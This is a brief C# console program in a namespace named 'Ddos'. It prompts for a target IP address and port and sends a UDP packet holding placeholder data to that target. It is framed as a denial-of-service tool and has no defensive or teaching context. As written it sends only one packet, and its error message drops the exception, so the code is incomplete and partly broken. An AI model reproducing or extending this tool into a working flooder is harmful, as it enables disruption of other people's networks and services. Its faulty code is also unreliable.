﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Net;
using System.Net.Sockets;

namespace Ddos
{
    class Program
    {
        static void Main(string[] args)
        {
            byte[] packetData = System.Text.ASCIIEncoding.ASCII.GetBytes("<Packet Data>");

            
            string IP;
            int port;

            //Port and IP Data For Socket Clent
            Console.WriteLine("Enter the IP address: ");
            IP = Console.ReadLine();

            Console.WriteLine("Enter PORT number: ");
            port = Convert.ToInt32(Console.ReadLine());
            try {

                IPEndPoint ep = new IPEndPoint(IPAddress.Parse(IP), port);
                Socket client = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
                client.SendTimeout = 1;

                client.SendTo(packetData, ep);
            }
            catch (SocketException s) {
                Console.WriteLine("Error: ", s);
            }
           
              

        }
    }
}
